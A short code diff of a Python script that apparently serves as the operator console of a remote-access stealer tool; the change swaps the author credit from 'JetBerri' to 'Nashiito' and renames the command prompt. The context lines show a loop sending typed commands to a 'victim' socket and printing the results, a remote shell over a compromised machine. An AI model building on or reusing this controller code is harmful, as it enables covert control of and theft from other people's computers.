@@ -16,7 +16,7 @@ while True:
      / __/ / /_/ / /_/_____/__/ / /_/  __/ /_/ / /  __/ /    
     /_/    \__,_/\__/     /____/\__/\___/\__,_/_/\___/_/     
 
-                    [@] Coded by JetBerri
+                    [@] Coded by Nashiito
 
         """
         )
@@ -32,7 +32,7 @@ while True:
     # Shell available for sending commands
     if cod == "1":
         while True:
-            op = input("Jet@cmd >>  ")
+            op = input("Nashiito@cmd >>  ")
             victim.send(op.encode("ascii"))
             result = victim.recv(2048)
             print(result)
